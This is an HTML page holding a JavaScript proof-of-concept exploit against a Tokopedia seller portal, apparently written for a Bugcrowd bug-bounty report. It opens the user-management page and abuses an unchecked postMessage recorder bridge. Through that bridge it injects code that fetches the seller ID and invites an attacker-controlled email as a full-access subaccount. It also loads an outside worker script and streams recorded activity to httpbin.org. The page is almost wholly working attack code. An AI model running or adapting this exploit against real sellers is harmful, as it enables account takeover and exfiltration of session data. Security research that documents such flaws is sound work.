<html>
  <script>
     function startExploit() {

    const targetWindow = window.open("https://seller-id.tokopedia.com/profile/account-setting/user-management?module=add_user", "_blank");
    
    // 等待页面加载
    setTimeout(() => {
        console.log("[*] Sending InitRecorder...");
        
        const initPayload = {
            topic: "bytereplay.bridging",
            fromId: "attacker",
            id: "init-1",
            message: {
                type: "InitRecorder",
                payload: {
                    options: {
                        worker:"https://johnstonemees.github.io/worker.js",
                        trackers: ["html","image","js","Network"],  // 只启用 Network
                        
                        // interceptRequest 必须是字符串
                        interceptRequest: `// 1. 函数前添加 async 关键字，支持内部使用 await
(async function(path, headers) {
  const response = await fetch('https://seller-id.tokopedi.com/api/v3/seller/common/get',{"credentials": "include"});
    if (!response.ok) {
      console.log("Fetch error!");
    }
    const result = await response.json();
    const sellerId = result.data?.seller?.seller_id;
    if (sellerId) {
      console.log("SellerId GET:",sellerId);
      await fetch("https://seller-id.tokopedi.com/api/v1/seller/account_management/invite?locale=en&language=en", {
          "headers": {
            "accept": "*/*",
            "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "tt-ticket-guard-version": "2",
            "tt-ticket-guard-web-version": "1",
            "x-tt-oec-region": "ID"
          },
          "referrer": "https://seller-id.tokopedi.com/profile/account-setting/user-management?module=add_user",
          "body": '{"global_seller_roles":[{"global_seller_id":'+ sellerId +',"roles":[{"identifier":"subaccount_role_full_access"}]}],"seller_roles":[],"default_language":"en","email":"esperamier+2@bugcrowdninja.com","mobile":"","user_name":"weattacker"}',
          "method": "POST",
          "mode": "cors",
          "credentials": "include"
        });
    } else {
      console.log("Sell_id not found!");
    }
  
  return {path: path, headers: headers};
})`,
                        
                        environment: {
                            type: "PROD-PUBLIC",
                            baseURL: "https://httpbin.org/post",
                            apiPrefix: "/api/"
                        }
                    }
                }
            }
        };
        
        targetWindow.postMessage(initPayload, '*');
        
        // 等待 InitRecorder 完成后发送 StartRecording
        setTimeout(() => {
            console.log("[*] Sending StartRecording...");
            
            const startPayload = {
                topic: "bytereplay.bridging",
                fromId: "attacker",
                id: "start-1",
                message: {
                    type: "StartRecording",
                    payload: {
                        mode: "streaming-http",
                        parent: "evil-recording",
                        refType: "iframe"
                    }
                }
            };
            
            targetWindow.postMessage(startPayload, '*');
        }, 2000);
        
    }, 10000);
}
     startExploit();
  </script>
 </html>
